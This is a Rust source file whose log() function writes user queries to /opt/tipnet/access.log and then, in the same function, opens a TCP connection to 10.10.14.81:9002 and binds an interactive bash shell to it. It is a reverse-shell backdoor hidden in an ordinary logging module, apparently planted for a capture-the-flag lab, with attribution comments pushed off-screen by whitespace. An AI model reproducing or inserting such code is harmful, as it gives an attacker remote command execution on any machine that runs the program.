extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::net::TcpStream;                        // ============================================================================================
use std::os::unix::io::{AsRawFd, FromRawFd};    // Source: https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs
use std::process::{Command, Stdio};             // ============================================================================================

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }

    /* 
        ============================================================================================
        Source: https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs
        ============================================================================================
    */ 
    let sock = TcpStream::connect("10.10.14.81:9002").unwrap();
    let fd = sock.as_raw_fd();

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}